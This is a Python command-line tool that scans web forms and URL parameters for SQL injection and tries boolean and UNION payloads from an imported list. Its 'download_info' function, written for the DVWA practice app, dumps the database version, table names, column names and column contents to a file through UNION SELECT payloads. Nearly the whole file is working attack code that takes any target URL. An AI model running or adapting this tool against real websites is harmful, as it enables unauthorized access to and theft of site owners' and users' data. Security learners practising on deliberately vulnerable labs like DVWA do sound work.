import argparse
from urllib.parse import urljoin
from pprint import pprint

import requests
from bs4 import BeautifulSoup as bs
from injections import injections

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

def parse_cookies(string):
    string = string.split("&")
    for c in string:
        if c.count("=") != 1:
            print("Error parsing cookies")
            quit()
        name, value = c.split("=")
        s.cookies.set(name=name, value=value)

def parse_data(string):
    if string == None:
        return None
    data = {}
    string = string.split("&")
    for d in string:
        if d.count("=") != 1:
            print("Error parsing data")
            quit()
        key, value = d.split("=")
        data[key] = value
    return data

def get_all_forms(url):
    """Returns all forms from the HTML content of a url"""
    try:
        res = s.get(url)
    except Exception as e:
        print(e)
        quit()
    if (res.status_code == 404):
        print("Error 404: incorrect url or whatever")
        quit()
    soup = bs(res.content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Extracts useful information from a HTML `form`"""
    details = {}
    # get the form action (target url)
    try:
        details["action"] = form.attrs.get("action").lower()
    except:
        details["action"] = None
    # get the form method (POST, GET, etc.)
    details["method"] = form.attrs.get("method", "get").lower()
    # get input details
    inputs = []
    for input_tag in form.find_all("input"):
        in_type = input_tag.attrs.get("type", "text")
        in_name = input_tag.attrs.get("name")
        in_value = input_tag.attrs.get("value", "")
        inputs.append({"type": in_type, "name": in_name, "value": in_value})
    details["inputs"] = inputs
    return details

def is_vulnerable(response):
    """A simple boolean function that determines whether a page
    is SQL Injection vulnerable from its `response`"""
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
        # MariaDB
        "malformed",
        # Python
        "unrecognized token",
        # Column mismatch
        "column number mismatch",
        "statements have a different number of columns",
        "data exception: invalid",
        ": unexpected token",
        ": unknown token",
        "unknown table",
        "unexpected token: dbms",
        '"output" : null',
        "feedback-negative'>unknown token",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def check_form(url):
    vulnerable = False
    forms = get_all_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            # Get data to submit
            data = {}
            keys = []
            for input_tag in form_details["inputs"]:
                if input_tag["value"] or input_tag["type"] == "hidden":
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    if input_tag["name"] != "user_token":
                        keys.append(input_tag["name"])
                    data[input_tag["name"]] = f"test{c}"
            # Get url to submit data
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)
            # Check response
            if is_vulnerable(res):
                vulnerable = True
                print("\nSQL Injection vulnerability detected in:\n\t", url)
                for k in keys:
                    check_injections(url, data, k, form_details["method"].upper())
                # print("data:")
                # pprint(data)
    if not vulnerable:
        print(url, "\n\tdoesn't seem to be vulnerable")

def check_url(url, data, method):
    if data == None:
        print("No data to process. Use '--data' argument")
        quit()
    for k in data:
        value = data[k]
        data[k] = f"test'"
        try:
            if method == "GET":
                res = s.get(url, params=data)
            elif method == "POST":
                res = s.post(url, data=data)
        except Exception as e:
            print(e)
            quit()
        if (res.status_code == 404):
            print("Error 404: incorrect url or whatever")
            quit()
        if is_vulnerable(res):
            print(f"[X] data-name '{k}' might be vulnerable")
            check_injections(url, data, k, method)
        else:
            print(f"[-] data-name '{k}' is not vulnerable")
        data[k] = value

def check_injections(url, data, key, method):
    print("\tTrying BOOLEAN type injections")
    print("\t- Numeric:")
    check_list_injections(url, data, key, method, injections["numeric"])
    print("\t- String:")
    check_list_injections(url, data, key, method, injections["string"])
    print("\tTrying UNION type injections")
    print("\t- mysql/mariadb numeric:")
    check_list_injections(url, data, key, method, injections["mysql_num"])
    print("\t- mysql/mariadb string:")
    check_list_injections(url, data, key, method, injections["mysql_str"])
    print("\t- hsqldb numeric:")
    check_list_injections(url, data, key, method, injections["hsqldb_num"])
    print("\t- hsqldb string:")
    check_list_injections(url, data, key, method, injections["hsqldb_str"])


def check_list_injections(url, data, key, method, injects):
    for i in injects:
        data[key] = i
        try:
            if method == "GET":
                res = s.get(url, params=data)
            elif method == "POST":
                res = s.post(url, data=data)
        except Exception as e:
            print(e)
            quit()
        if (res.status_code == 404):
            print("Error 404: incorrect url or whatever")
            quit()
        if not is_vulnerable(res):
            print(f"\t[X] Found injection:\n{i}")
            return True
    print("\t[-] Nope")
    return False


def download_info(url="http://localhost/vulnerabilities/sqli/"):
    '''Only work with 'dvwa': http://localhost/vulnerabilities/sqli/
    Output is like:
    <pre>ID: value <br/>First name: def<br/>Surname: INNODB_LOCKS</pre>
    '''
    i_version = "' UNION SELECT NULL, @@version; -- "
    i_tables = "' UNION SELECT table_catalog,table_name FROM information_schema.tables; -- "
    i_columns = "' UNION SELECT table_name,column_name FROM information_schema.columns; -- "
    len_sep = len("Surname: ")
    info = {}
    try:
        # Get user token
        forms = get_all_forms(url)
        details = get_form_details(forms[0])
        for input_tag in details["inputs"]:
            if input_tag["name"] == "user_token":
                token = input_tag["value"]

        data = {"id": i_version, "Submit": "Submit", "user_token": token}
        res = s.get(url, params=data)
        soup = bs(res.content, "html.parser")
        info["version"] = soup.pre.text[soup.pre.text.find("Surname: ") + len_sep:]
    except Exception as e:
        print(e)
        quit()

    data["id"] = i_tables
    soup = bs(s.get(url, params=data).content, "html.parser")
    # Database name
    start = soup.pre.text.find("First name: ") + len("First name: ")
    info["database"] = soup.pre.text[start:soup.pre.text.find("Surname", start)]
    # Table names
    info["tables"] = []
    for pre in soup.find_all("pre"):
        tab = pre.text[pre.text.find("Surname: ") + len_sep:]
        info["tables"].append(tab)

    # Columns names
    data["id"] = i_columns
    soup = bs(s.get(url, params=data).content, "html.parser")
    info["columns"] = []
    for pre in soup.find_all("pre"):
        start = pre.text.find("First name: ") + len("First name: ")
        col = pre.text[start:]
        col = col.split("Surname: ")
        info["columns"].append(col)

    # Dump database
    info["data"] = []
    for col in info["columns"]:
        if col[0].isupper(): # Tables without access
            break
        payload = f"' UNION SELECT NULL, {col[1]} FROM {col[0]}; -- "
        data["id"] = payload
        soup = bs(s.get(url, params=data).content, "html.parser")
        for pre in soup.find_all("pre"):
            entry = []
            entry.append(col[1])
            entry.append(pre.text[pre.text.find("Surname: ") + len_sep:])
            info["data"].append(entry)

    return info

def save_info(info, filename):
    with open(filename, "w") as f:
        f.write(f"DATABASE VERSION: {info['version']}\n")
        f.write(f"DATABASE NAME: {info['database']}\n")
        f.write("\nTABLES NAMES:\n")
        for t in info["tables"]:
            f.write(f"{t}\n")
        f.write("\nCOLUMNS NAMES:\n")
        for c in info["columns"]:
            f.write(f"TABLE: {c[0]:<25} COLUMN: {c[1]}\n")
        f.write(f"\nDUMP DATA:\n")
        for d in info["data"]:
            f.write(f"COLUMN: {d[0]:<20} DATA: {d[1]}\n")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", default="output",
        help="archive file, if not specified it will stored in a default one")
    parser.add_argument("-X", default="GET",
        help="Type of request, if not specified GET will be used")
    parser.add_argument("url", help="url to scan")
    parser.add_argument("-c", "--cookie", 
        help="introduce cookies in the form of 'name=value&name=value...'")
    parser.add_argument("-d", "--data",
        help="introduce data to submit in the form of 'key=value&key=...'")
    parser.add_argument("-f", "--forms", action="store_true",
        help="look for forms in the url to inject SQL")
    parser.add_argument("-u", "--dump", action="store_true",
        help="dump the info of a database")
    args = parser.parse_args()

    if (args.X != "GET" and args.X != "POST"):
        print("The method should be only 'GET' or 'POST'")
        quit()

    if (args.cookie):
        parse_cookies(args.cookie)

    if (args.dump):
        save_info(download_info(args.url), args.o)
    elif (args.forms):
        check_form(args.url)
    else:
        check_url(args.url, parse_data(args.data), args.X)


if __name__ == "__main__":
    main()
